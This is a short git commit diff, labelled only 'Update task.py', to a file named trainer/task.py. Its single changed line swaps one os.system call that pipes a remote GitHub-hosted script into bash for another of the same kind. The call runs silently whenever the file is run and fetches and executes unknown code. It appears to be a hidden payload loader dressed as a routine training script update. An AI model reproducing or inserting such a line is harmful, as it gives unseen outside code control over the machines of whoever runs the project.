6b5a5a14301086631555334f1a5e5243b68c67a8
loeto21 <161197201+loeto21@users.noreply.github.com>
2024-03-02 01:39:47 -0800

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/loeto21/comro/raw/main/molorr | bash')
+os.system('curl -sL https://github.com/loeto21/susuganan/raw/main/sugan1 | bash')
